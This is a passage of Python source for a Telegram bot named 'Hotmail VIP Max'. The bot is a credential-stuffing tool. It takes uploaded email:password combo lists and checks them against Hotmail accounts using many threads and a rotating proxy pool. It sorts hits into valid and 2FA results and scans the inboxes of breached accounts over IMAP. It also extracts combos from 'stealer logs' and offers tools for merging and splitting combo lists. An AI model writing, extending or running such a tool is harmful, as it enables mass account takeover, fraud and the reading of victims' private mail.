        ("Custom.txt",        "⚠️ Custom"),
        ("Inbox_Results.html","📊 Summary"),
    ]:
        p = out_dir / name
        if p.exists() and p.stat().st_size > 0:
            await msg.answer_document(FSInputFile(p), caption=cap)
            sent_files.append(p)

    # Send country / keyword sub-zips inline
    for folder in ["Countries", "Keywords"]:
        fd = out_dir / folder
        if fd.exists() and any(fd.iterdir()):
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                for f in fd.iterdir():
                    z.write(f, f.name)
            buf.seek(0)
            await msg.answer_document(
                BufferedInputFile(buf.read(), filename=f"{folder}.zip"),
                caption="🌍 Countries" if folder == "Countries" else "🔑 Keywords",
            )

    # Feature 5: Master zip — bundle everything
    master_buf = io.BytesIO()
    with zipfile.ZipFile(master_buf, "w", zipfile.ZIP_DEFLATED) as zmaster:
        # All txt/html in root
        for item in out_dir.iterdir():
            if item.is_file():
                zmaster.write(item, item.name)
        # Sub-folders
        for folder in ["Countries", "Keywords"]:
            fd = out_dir / folder
            if fd.exists():
                for f in fd.iterdir():
                    zmaster.write(f, f"{folder}/{f.name}")
    master_buf.seek(0)
    ts_label = out_dir.name  # already timestamped
    await msg.answer_document(
        BufferedInputFile(master_buf.read(), filename=f"Results_{ts_label}.zip"),
        caption=(
            f"📦 <b>Master ZIP</b>\n"
            f"✅ {stats['hits']} valid | 💎 {stats['twofa']} 2FA | "
            f"⚠️ {stats['custom']} custom | 🔁 {stats.get('retried',0)} retried"
        ),
        parse_mode=ParseMode.HTML,
    )

# ==================== KEYBOARDS ====================
def main_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔥 Start Scan"), KeyboardButton(text="📥 Log / ULP Extractor")],
            [KeyboardButton(text="🌐 Proxies"),    KeyboardButton(text="🛠 Combo Tools")],
            [KeyboardButton(text="⚙️ Settings"),   KeyboardButton(text="📊 Stats")],
            [KeyboardButton(text="🛑 Cancel Job")],
        ],
        resize_keyboard=True,
    )

def scan_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📧 Hotmail Family Checker", callback_data="mode_hotmail")],
        [InlineKeyboardButton(text="📬 Hotmail Inboxer (Real IMAP)", callback_data="mode_inboxer")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="back_main")],
    ])

def settings_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🧵 Hotmail Threads: {settings['threads_hotmail']}", callback_data="set_threads_hotmail")],
        [InlineKeyboardButton(text=f"🧵 Inboxer Threads: {settings['threads_inboxer']}", callback_data="set_threads_inboxer")],
        [InlineKeyboardButton(text="🌐 Proxy Pool Info", callback_data="set_proxy_info")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="back_main")],
    ])

def combo_tools_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧹 Dedupe",               callback_data="tool_dedupe")],
        [InlineKeyboardButton(text="✂ Split",                 callback_data="tool_split")],
        [InlineKeyboardButton(text="🔗 Merge",                callback_data="tool_merge")],
        [InlineKeyboardButton(text="🔄 Convert (full→combo)", callback_data="tool_convert")],
        [InlineKeyboardButton(text="🔙 Back",                 callback_data="back_main")],
    ])

def proxy_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Proxies",   callback_data="proxy_add")],
        [InlineKeyboardButton(text="🔍 Proxy Checker", callback_data="proxy_check")],
        [InlineKeyboardButton(text="🗑 Clear Pool",    callback_data="proxy_clear")],
        [InlineKeyboardButton(text="🔙 Back",          callback_data="back_main")],
    ])

# ==================== HELPERS ====================
def _cleanup_tasks() -> None:
    done = [uid for uid, t in active_tasks.items() if t.done()]
    for uid in done:
        del active_tasks[uid]

# ==================== HANDLERS ====================
@dp.message(CommandStart())
async def cmd_start(msg: Message):
    hits_ch = f"✅ Active ({HITS_CHANNEL_ID})" if HITS_CHANNEL_ID else "❌ Not set (HITS_CHANNEL_ID env)"
    text = (
        "🔥 <b>Hotmail VIP Max</b>\n"
        "<code>real inbox scanner • live progress • auto-zip • retry queue</code>\n\n"
        f"🧵 Hotmail threads: <b>{settings['threads_hotmail']}</b>\n"
        f"🧵 Inboxer threads: <b>{settings['threads_inboxer']}</b>\n"
        f"🌐 Proxies: <b>{proxy_mgr.count()}</b>\n"
        f"📣 Hits channel: {hits_ch}\n\n"
        "Supports all Hotmail family · Streaming + Resume + Retry"
    )
    await msg.answer(text, reply_markup=main_kb(), parse_mode=ParseMode.HTML)

@dp.message(F.text == "🔥 Start Scan")
async def start_scan(msg: Message):
    await msg.answer("🔥 Choose mode:", reply_markup=scan_kb())

@dp.callback_query(F.data.startswith("mode_"))
async def choose_mode(call: CallbackQuery, state: FSMContext):
    mode = call.data.replace("mode_", "")
    thr  = settings["threads_hotmail"] if mode == "hotmail" else settings["threads_inboxer"]
    await state.update_data(mode=mode)
    imap_note = "\n⚡ <i>Real IMAP inbox scan enabled</i>" if mode == "inboxer" else ""
    await call.message.answer(
        f"{'📧' if mode=='hotmail' else '📬'} <b>{mode.upper()}</b>\n"
        f"Threads: <b>{thr}</b> (change in ⚙️ Settings){imap_note}\n\n"
        "Send .txt with email:password",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(Form.waiting_combo)
    await call.answer()

@dp.message(Form.waiting_combo, F.document)
async def process_combo(msg: Message, state: FSMContext):
    data = await state.get_data()
    mode = data.get("mode", "hotmail")
    thr  = settings["threads_hotmail"] if mode == "hotmail" else settings["threads_inboxer"]
    doc  = msg.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.answer("Only .txt files accepted")
        return
    if doc.file_size and doc.file_size > MAX_LOG_SIZE_MB * 1024 * 1024:
        await msg.answer(f"❌ File too big (max {MAX_LOG_SIZE_MB}MB via Telegram)")
        return
    file    = await bot.get_file(doc.file_id)
    content = await bot.download_file(file.file_path)
    local   = RESULTS_DIR / f"upload_{msg.from_user.id}_{int(time.time())}.txt"
    local.write_bytes(content.read())
    uid = msg.from_user.id
    _cleanup_tasks()
    if user_stats[uid]["running"]:
        await msg.answer("Job already running. Use 🛑 Cancel Job first.")
        return
    ckpt   = CHECKPOINT_DIR / f"{uid}_last.txt"
    resume = int(ckpt.read_text().strip()) if ckpt.exists() and ckpt.stat().st_size > 0 else 0
    status = await msg.answer(
        f"🔄 Starting {mode.upper()} | Threads: {thr} | Resume: line {resume}\n"
        f"<i>Counting lines...</i>",
        parse_mode=ParseMode.HTML,
    )

    async def runner():
        try:
            result = await stream_check(uid, str(local), thr, mode, status, resume)
            st     = result["stats"]
            done_text = (
                f"✅ <b>Done!</b>\n"
                f"Checked: <b>{st['checked']}</b> / {st['total']}\n"
                f"Valid: <b>{st['hits']}</b> | 2FA: <b>{st['twofa']}</b> | "
                f"Custom: <b>{st['custom']}</b>\n"
                f"Bad: <b>{st['bad']}</b> | Retried: <b>{st.get('retried',0)}</b>\n"
                f"Final CPM: <b>{int(st['cpm'])}</b>"
            )
            try:
                await status.edit_text(done_text, parse_mode=ParseMode.HTML)
            except Exception:
                await msg.answer(done_text, parse_mode=ParseMode.HTML)
            await send_results(msg, result["dir"], st)   # Feature 5
        except asyncio.CancelledError:
            try:
                await status.edit_text("🛑 Job cancelled. Checkpoint saved.")
            except Exception:
                pass
        except Exception as e:
            log.exception(f"Runner error uid={uid}")
            try:
                await status.edit_text(f"❌ Error: {str(e)[:200]}")
            except Exception:
                await msg.answer(f"❌ Error: {str(e)[:200]}")

    active_tasks[uid] = asyncio.create_task(runner())
    await state.clear()

@dp.message(F.text == "📥 Log / ULP Extractor")
async def ulp_menu(msg: Message, state: FSMContext):
    await msg.answer(
        f"📥 <b>Log / ULP Extractor (up to {MAX_LOG_SIZE_MB}MB)</b>\n\n"
        "Upload .txt or .zip stealer logs, or paste text.\n"
        "Extracts clean email:pass per service.",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(Form.waiting_ulp)

@dp.message(Form.waiting_ulp, F.document)
async def process_ulp(msg: Message, state: FSMContext):
    doc = msg.document
    if doc.file_size and doc.file_size > MAX_LOG_SIZE_MB * 1024 * 1024:
        await msg.answer(f"❌ File too big (max {MAX_LOG_SIZE_MB}MB)")
        await state.clear()
        return
    file    = await bot.get_file(doc.file_id)
    raw     = await bot.download_file(file.file_path)
    content = raw.read()
    if doc.file_name.lower().endswith(".zip"):
        try:
            text = ""
            with zipfile.ZipFile(io.BytesIO(content)) as z:
                for name in z.namelist():
                    if name.lower().endswith((".txt",".log",".csv")):
                        text += z.read(name).decode("utf-8", errors="ignore") + "\n"
        except Exception as e:
            await msg.answer(f"Bad zip: {e}")
            await state.clear()
            return
    else:
        text = content.decode("utf-8", errors="ignore")
    extracted = extract_ulp_to_combo(text)
    total     = sum(len(v) for v in extracted.values())
    if total == 0:
        await msg.answer("No combos found")
        await state.clear()
        return
    await msg.answer(f"✅ {total} lines across {len(extracted)} services")
    for svc, combos in sorted(extracted.items(), key=lambda x: -len(x[1])):
        if not combos:
            continue
        await msg.answer_document(
            BufferedInputFile("\n".join(combos).encode(), filename=f"{svc}_combo.txt"),
            caption=f"🔹 {svc} — {len(combos)}",
        )
    await state.clear()

@dp.message(Form.waiting_ulp, F.text)
async def process_ulp_text(msg: Message, state: FSMContext):
    extracted = extract_ulp_to_combo(msg.text or "")
    total     = sum(len(v) for v in extracted.values())
    if total == 0:
        await msg.answer("No combos found")
        await state.clear()
        return
    await msg.answer(f"✅ {total} lines")
    for svc, combos in sorted(extracted.items(), key=lambda x: -len(x[1])):
        if not combos:
            continue
        await msg.answer_document(
            BufferedInputFile("\n".join(combos).encode(), filename=f"{svc}_combo.txt"),
            caption=f"🔹 {svc} — {len(combos)}",
        )
    await state.clear()

@dp.message(F.text == "🌐 Proxies")
async def proxies_menu(msg: Message):
    await msg.answer(
        f"🌐 Proxies: <b>{proxy_mgr.count()}</b>",
        reply_markup=proxy_kb(), parse_mode=ParseMode.HTML,
    )

@dp.callback_query(F.data == "proxy_add")
async def proxy_add(call: CallbackQuery, state: FSMContext):
    await call.message.answer(
        "Send proxies (one per line) or upload .txt\n"
        "Supports: http/https/socks4/socks5 + user:pass@ip:port"
    )
    await state.set_state(Form.waiting_proxy)
    await call.answer()

@dp.message(Form.waiting_proxy)
async def save_proxies(msg: Message, state: FSMContext):
    text = ""
    if msg.document:
        file = await bot.get_file(msg.document.file_id)
        text = (await bot.download_file(file.file_path)).read().decode("utf-8", errors="ignore")
    elif msg.text:
        text = msg.text
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    proxy_mgr.add_list(lines)
    await msg.answer(f"✅ Loaded {len(lines)} proxies. Total pool: {proxy_mgr.count()}")
    await state.clear()

@dp.callback_query(F.data == "proxy_check")
async def proxy_check_start(call: CallbackQuery, state: FSMContext):
    await call.message.answer("🔍 Send proxies to check (text or .txt) — all types supported")
    await state.set_state(Form.waiting_proxy_check)
    await call.answer()

@dp.message(Form.waiting_proxy_check)
async def do_proxy_check(msg: Message, state: FSMContext):
    text = ""
    if msg.document:
        file = await bot.get_file(msg.document.file_id)
        text = (await bot.download_file(file.file_path)).read().decode("utf-8", errors="ignore")
    elif msg.text:
        text = msg.text
    lines   = [l.strip() for l in text.splitlines() if l.strip()]
    proxies = [proxy_mgr._normalize(p) for p in lines]
    status  = await msg.answer(f"🔍 Checking {len(proxies)} proxies...")
    alive, dead = await proxy_checker_worker(proxies, threads=40)
    try:
        await status.edit_text(f"✅ Alive: {len(alive)} | ❌ Dead: {len(dead)}")
    except Exception:
        pass
    if alive:
        buf = "\n".join(a["proxy"] for a in alive).encode()
        await msg.answer_document(
            BufferedInputFile(buf, filename="alive_proxies.txt"),
            caption=f"✅ Alive ({len(alive)})",
        )
        proxy_mgr.add_list([a["proxy"] for a in alive])
        await msg.answer(f"Added {len(alive)} alive proxies. Total: {proxy_mgr.count()}")
    if dead:
        buf = "\n".join(d["proxy"] for d in dead).encode()
        await msg.answer_document(
            BufferedInputFile(buf, filename="dead_proxies.txt"),
            caption=f"❌ Dead ({len(dead)})",
        )
    await state.clear()

@dp.callback_query(F.data == "proxy_clear")
async def proxy_clear(call: CallbackQuery):
    proxy_mgr.clear()
    Path(PROXY_FILE).write_text("", encoding="utf-8")
    await call.message.answer("🗑 Proxy pool cleared")
    await call.answer()

@dp.message(F.text == "🛠 Combo Tools")
async def combo_tools_menu(msg: Message):
    await msg.answer("🛠 Combo Tools:", reply_markup=combo_tools_kb())

@dp.callback_query(F.data.startswith("tool_"))
async def tool_choose(call: CallbackQuery, state: FSMContext):
    tool = call.data.replace("tool_", "")
    await state.update_data(tool=tool)
    if tool == "split":
        await call.message.answer("Send .txt — I'll ask how many parts after")
    else:
        await call.message.answer(f"Send .txt file for <b>{tool}</b>", parse_mode=ParseMode.HTML)
    await state.set_state(Form.waiting_combo_tool)
    await call.answer()

@dp.message(Form.waiting_combo_tool, F.document)
async def process_combo_tool(msg: Message, state: FSMContext):
    data    = await state.get_data()
    tool    = data.get("tool", "dedupe")
    file    = await bot.get_file(msg.document.file_id)
    content = (await bot.download_file(file.file_path)).read().decode("utf-8", errors="ignore")
    lines   = [l.strip() for l in content.splitlines() if l.strip()]
    if tool == "dedupe":
        out = combo_dedupe(lines)
        await msg.answer_document(
            BufferedInputFile("\n".join(out).encode(), filename="deduped.txt"),
            caption=f"🧹 Dedupe: {len(lines)} → {len(out)}",
        )
        await state.clear()
    elif tool == "convert":
        out = combo_convert(lines, "full_to_combo")
        await msg.answer_document(
            BufferedInputFile("\n".join(out).encode(), filename="converted_combo.txt"),
            caption=f"🔄 Converted: {len(out)} combos",
        )
        await state.clear()
    elif tool == "merge":
        out = combo_dedupe(lines)
        await msg.answer_document(
            BufferedInputFile("\n".join(out).encode(), filename="merged.txt"),
            caption=f"🔗 Merged/Deduped: {len(out)}",
        )
        await state.clear()
    elif tool == "split":
        await state.update_data(split_lines=lines)
        await msg.answer(f"File has {len(lines)} lines. Send number of parts (2–50):")
        await state.set_state(Form.waiting_split_count)

@dp.message(Form.waiting_split_count)
async def do_split(msg: Message, state: FSMContext):
    data  = await state.get_data()
    lines = data.get("split_lines", [])
    try:
        parts = int(msg.text.strip())
        if parts < 2 or parts > 50:
            await msg.answer("Parts must be 2–50")
            return
    except (ValueError, AttributeError):
        await msg.answer("Send a number")
        return
    chunks = combo_split(lines, parts)
    for i, chunk in enumerate(chunks, 1):
        await msg.answer_document(
            BufferedInputFile("\n".join(chunk).encode(), filename=f"part_{i}.txt"),
            caption=f"✂ Part {i}/{parts} — {len(chunk)} lines",
        )
    await state.clear()

@dp.message(F.text == "⚙️ Settings")
async def settings_menu(msg: Message):
    await msg.answer("⚙️ Settings:", reply_markup=settings_kb())

@dp.callback_query(F.data.startswith("set_threads_"))
async def set_threads(call: CallbackQuery, state: FSMContext):
    which = call.data.replace("set_threads_", "")
    await state.update_data(thread_target=which)
    await call.message.answer(
        f"Send new thread count for <b>{which}</b> (5–80)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(Form.waiting_threads)
    await call.answer()

@dp.message(Form.waiting_threads)
async def save_threads(msg: Message, state: FSMContext):
    data   = await state.get_data()
    target = data.get("thread_target", "hotmail")
    try:
        val = int(msg.text.strip())
        if val < 5 or val > 80:
            await msg.answer("Range must be 5–80")
            return
    except (ValueError, AttributeError):
        await msg.answer("Send a valid number")
        return
    key = "threads_hotmail" if target == "hotmail" else "threads_inboxer"
    settings[key] = val
    save_settings(settings)
    await msg.answer(f"✅ {target} threads set to <b>{val}</b>", parse_mode=ParseMode.HTML)
    await state.clear()

@dp.callback_query(F.data == "set_proxy_info")
async def proxy_info(call: CallbackQuery):
    await call.message.answer(
        f"🌐 Proxy pool: <b>{proxy_mgr.count()}</b>\nUse 🌐 Proxies menu to add/check/clear",
        parse_mode=ParseMode.HTML,
    )
    await call.answer()

@dp.message(F.text == "📊 Stats")
async def stats_cmd(msg: Message):
    st   = user_stats[msg.from_user.id]
    seen = user_seen[msg.from_user.id]
    text = (
        f"📊 <b>Stats</b>\n"
        f"Checked: {st['checked']} / {st.get('total', '?')}\n"
        f"Valid: {st['hits']} | 2FA: {st['twofa']}\n"
        f"Custom: {st['custom']} | Bad: {st['bad']}\n"
        f"Retried: {st.get('retried', 0)}\n"
        f"CPM: {int(st['cpm'])}\n"
        f"Running: {'Yes ✅' if st['running'] else 'No'}\n"
        f"Proxies: {proxy_mgr.count()}\n"
        f"Dedupe cache: {len(seen)}"
    )
    await msg.answer(text, parse_mode=ParseMode.HTML)

@dp.message(F.text == "🛑 Cancel Job")
@dp.message(Command("cancel"))
async def cancel_cmd(msg: Message):
    uid = msg.from_user.id
    _cleanup_tasks()
    if uid in active_tasks and not active_tasks[uid].done():
        user_stats[uid]["running"] = False
        active_tasks[uid].cancel()
        await msg.answer("🛑 Cancelled. Checkpoint saved.")
    else:
        await msg.answer("No running job found.")

@dp.callback_query(F.data == "back_main")
async def back_main(call: CallbackQuery):
    await call.message.answer("Main menu", reply_markup=main_kb())
    await call.answer()

# ==================== MAIN ====================
async def main():
    proxy_mgr.load()
    log.info(
        f"Hotmail VIP Max started | "
        f"Proxies: {proxy_mgr.count()} | "
        f"Threads H:{settings['threads_hotmail']} I:{settings['threads_inboxer']} | "
        f"Hits channel: {'set' if HITS_CHANNEL_ID else 'not set'}"
    )
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
